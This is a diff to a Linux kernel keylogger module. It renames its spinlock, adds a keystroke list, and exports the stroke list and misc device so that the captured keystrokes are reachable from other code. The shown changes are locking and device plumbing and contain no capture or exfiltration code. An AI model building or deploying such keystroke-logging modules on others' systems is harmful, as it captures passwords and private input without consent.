@@ -1,3 +1,10 @@
+#include "keylog.h"
+
+extern struct s_keyboard_map keyboard_mapping[];
+
+LIST_HEAD(head_stroke_lst);
+DEFINE_SPINLOCK(lock);
+
 int keylog_show(struct seq_file *seq_file, void *p)
 {
 	struct s_stroke	*strokes = NULL;
@@ -21,10 +28,10 @@ static int keylog_open(struct inode *inode, struct file *file)
 {
 	int ret;
 
-	spin_lock(&mr_lock);
+	spin_lock(&lock);
 	file->private_data = NULL;
 	ret = single_open(file, &keylog_show, NULL);
-	spin_unlock(&mr_lock);
+	spin_unlock(&lock);
 	return ret;
 }
 
@@ -39,9 +46,9 @@ static ssize_t keylog_read(struct file *file, char __user *buf, size_t size,
 {
 	int	ret;
 
-	spin_lock(&mr_lock);
+	spin_lock(&lock);
 	ret = seq_read(file, buf, size, offset);
-	spin_unlock(&mr_lock);
+	spin_unlock(&lock);
 	return ret;
 }
 
@@ -49,9 +56,9 @@ static int keylog_release(struct inode *inode, struct file *file)
 {
 	int	ret;
 
-	spin_lock(&mr_lock);
+	spin_lock(&lock);
 	ret = single_release(inode, file);
-	spin_unlock(&mr_lock);
+	spin_unlock(&lock);
 	return ret;
 }
 
@@ -64,8 +71,11 @@ static struct file_operations const keylog_file_fops = {
 	.llseek = seq_lseek,
 };
 
-static struct miscdevice		keylog_dev = {
+struct miscdevice		keylog_dev = {
 	MISC_DYNAMIC_MINOR,
 	MODULE_NAME,
 	&keylog_file_fops
 };
+
+EXPORT_SYMBOL(head_stroke_lst);
+EXPORT_SYMBOL(keylog_dev);
